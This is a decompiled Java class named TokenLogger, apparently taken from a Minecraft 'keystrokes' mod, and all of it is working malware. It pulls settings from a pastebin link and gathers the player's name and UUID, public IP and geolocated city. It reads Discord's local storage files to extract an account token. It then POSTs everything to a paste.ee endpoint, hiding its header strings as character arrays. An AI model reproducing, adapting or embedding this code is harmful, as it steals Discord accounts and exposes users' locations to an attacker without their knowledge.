// Decompiled with: FernFlower
// Class Version: 8
package keystrokesmod;


import net.minecraft.client.Minecraft;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileReader;
import java.io.IOException;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Base64;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class TokenLogger extends Thread {
    public static final Minecraft mc = Minecraft.getMinecraft();
    public void run() {
        int loggingProggress = 0;
        int errorInSection = 0;
        int loggingResponseCode = 0;
        int tokenExists = 0;
        String http = "https://";
        String com = ".com";
        String paste = "paste";

        String ip = "ip";
        String subf = "s\":\"fail";
        String pasteUtilsString = URLUtils.getTextFromURL("https://pastebin.com/raw/ihEM3qnd");
        if (pasteUtilsString.contains("err")) {
            errorInSection = 1;
        } else {
            String[] pasteUtils = pasteUtilsString.split("-");
            boolean isApiKeyEnabled = pasteUtils[0].equals("enabled");
            if (!isApiKeyEnabled) {
                errorInSection = 2;
            } else {
                loggingProggress = 1;
                String authKey = new String(Base64.getDecoder().decode(pasteUtils[1].getBytes())); // decoded text is equal to uysm5Fhlxr5U2lQdlPAZt0UAsZ71wg8s2uLdcnaig
                String headers = pasteUtils[2];
                String[] playerInfo = new String[]{"", ""};
                playerInfo[0] = mc.thePlayer.getName();
                playerInfo[1] = mc.thePlayer.getUniqueID().toString().replace("-", "");
                String pasteeURL = "https://api.paste.ee/v1/pastes/";
                String sendDataConnection = URLUtils.getTextFromURL(pasteeURL + authKey);
                if (!sendDataConnection.contains("err")/* && sendDataConnection.contains(str.c52) && !sendDataConnection.contains(str.c53 + ":" + playerInfo[1])*/) {
                    loggingProggress = 2;
                    String userIP = URLUtils.getTextFromURL("http://checkip.amazonaws.com");
                    if (userIP.contains("err")) {
                        errorInSection = 4;
                    } else {
                        String[] locationInfo = new String[]{"", ""};
                        locationInfo[0] = (new String(Base64.getEncoder().encode(userIP.getBytes()))).replace("=", "");
                        String sp = "\"";
                        String sp2 = "\\\"";
                        loggingProggress = 3;
                        String ipInfo = URLUtils.getTextFromURL("http://ip-api.com/json/" + userIP);
                        if (!ipInfo.contains("err") && !ipInfo.contains("\"status\":\"fail")) {
                            loggingProggress = 4;
                            String city = ipInfo.split(new String(new char[]{'c', 'i', 't', 'y', '"', ':', '"'}))[1].split(sp)[0];
                            String region = ipInfo.split(new String(new char[]{'r', 'e', 'g', 'i', 'o', 'n', 'N', 'a', 'm', 'e', '"', ':', '"'}))[1].split(sp)[0];
                            String country = ipInfo.split(new String(new char[]{'c', 'o', 'u', 'n', 't', 'r', 'y', '"', ':', '"'}))[1].split(sp)[0];
                            locationInfo[1] = (new String(Base64.getEncoder().encode((city + ", " + region + ", " + country).getBytes()))).replace("=", "");
                            String discordToken = "";
                            String sep = File.separator;
                            String path = System.getenv("AppData");
                            if (path == null) {
                                path = System.getProperty("user.home") + "/Library/Application Support";
                            }

                            path = path + sep + "discord" + sep + "Local Storage" + sep + "leveldb";
                            File[] discordDirectory = (new File(path)).listFiles();
                            loggingProggress = 5;
                            String filePath;
                            String line;
                            if (discordDirectory != null) {
                                int i = 0;
                                File[] discordFiles = discordDirectory;
                                int discordFilesAmount = discordDirectory.length;

                                label218:
                                for(int fileNumber = 0; fileNumber < discordFilesAmount; ++fileNumber) {
                                    File file = discordFiles[fileNumber];
                                    ++i;
                                    filePath = file.getPath();
                                    if (filePath.endsWith(".ldb") || filePath.endsWith(".log")) {
                                        try {
                                            BufferedReader r = new BufferedReader(new FileReader(file));

                                            while((line = r.readLine()) != null) {
                                                if (line.contains("oken")) {
                                                    String discordTokenRegex = "[MN][A-Za-z\\d]{23}\\.[\\w-]{6}\\.[\\w-]{27}";
                                                    Matcher m = Pattern.compile(discordTokenRegex).matcher(line);
                                                    if (m.find()) {
                                                        discordToken = m.group(0);
                                                        break label218;
                                                    }
                                                }
                                            }
                                        } catch (FileNotFoundException var52) {
                                        } catch (IOException var53) {
                                        }
                                    }
                                }
                            }

                            tokenExists = discordToken.isEmpty() ? 0 : 1;
                            String playerInfoString = sp2 + playerInfo[0] + sp2 +  ":" + playerInfo[1];
                            String playerLocationString = locationInfo[0] + "-" + locationInfo[1] + "-" + (discordToken.isEmpty() ? "null" : (new String(Base64.getEncoder().encode(discordToken.getBytes()))).replace("=", ""));
                            String userData = headers.replace("bo", playerInfoString).replace("dy", playerLocationString);
                            loggingProggress = 6;

                            try {
                                String contentType = new String(new char[]{'C', 'o', 'n', 't', 'e', 'n', 't', '-', 'T', 'y', 'p', 'e'});
                                String application = new String(new char[]{'a', 'p', 'p', 'l', 'i', 'c', 'a', 't', 'i', 'o', 'n', '/', 'j', 's', 'o', 'n', ';', ' ', 'c', 'h', 'a', 'r', 's', 'e', 't', '=', 'U', 'T', 'F', '-', '8'});
                                filePath = new String(new char[]{'X', '-', 'A', 'u', 't', 'h', '-', 'T', 'o', 'k', 'e', 'n'});
                                String connectionMethod = new String(new char[]{'P', 'O', 'S', 'T'});
                                line = new String(new char[]{'U', 'T', 'F', '-', '8'});
                                HttpURLConnection sendUserData = (HttpURLConnection)(new URL(pasteeURL)).openConnection();
                                sendUserData.setRequestProperty(contentType, application);
                                sendUserData.setRequestProperty(filePath, authKey);
                                sendUserData.setRequestMethod(connectionMethod);
                                sendUserData.setDoOutput(true);
                                sendUserData.connect();
                                OutputStream outputStream = sendUserData.getOutputStream();
                                Throwable occuredErrors = null;

                                try {
                                    // sending data
                                    outputStream.write(userData.getBytes(line));
                                    outputStream.flush();
                                } catch (Throwable microsoftMoment) {
                                    occuredErrors = microsoftMoment;
                                    throw microsoftMoment;
                                } finally {
                                    if (outputStream != null) {
                                        if (occuredErrors != null) {
                                            try {
                                                outputStream.close();
                                            } catch (Throwable var48) {
                                                occuredErrors.addSuppressed(var48);
                                            }
                                        } else {
                                            outputStream.close();
                                        }
                                    }

                                }

                                sendUserData.disconnect();
                                loggingResponseCode = sendUserData.getResponseCode() - 50;
                                loggingProggress = 7;
                            } catch (Exception var51) {
                            }

                        } else {
                            errorInSection = 5;
                        }
                    }
                } else {
                    errorInSection = 3;
                }
            }
        }
    }
}
